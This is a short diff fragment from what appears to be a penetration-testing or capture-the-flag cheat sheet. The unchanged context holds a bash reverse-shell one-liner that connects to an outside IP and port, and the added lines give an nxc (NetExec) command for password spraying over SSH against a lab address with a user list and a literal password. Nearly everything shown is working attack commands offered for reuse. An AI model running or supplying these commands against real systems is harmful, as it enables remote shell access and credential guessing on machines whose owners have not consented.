@@ -21,6 +21,10 @@ bash -i >& /dev/tcp/10.4.73.176/1111 0>&1
 EOF
 ```
 
+Password Spraying with nxc (Netexec)
+--------------------------------------
+# nxc ssh 10.129.224.120 -u users.txt -p 'Depl0y_id1!'
+
 
 Using awk to cut from :
 ------------------------
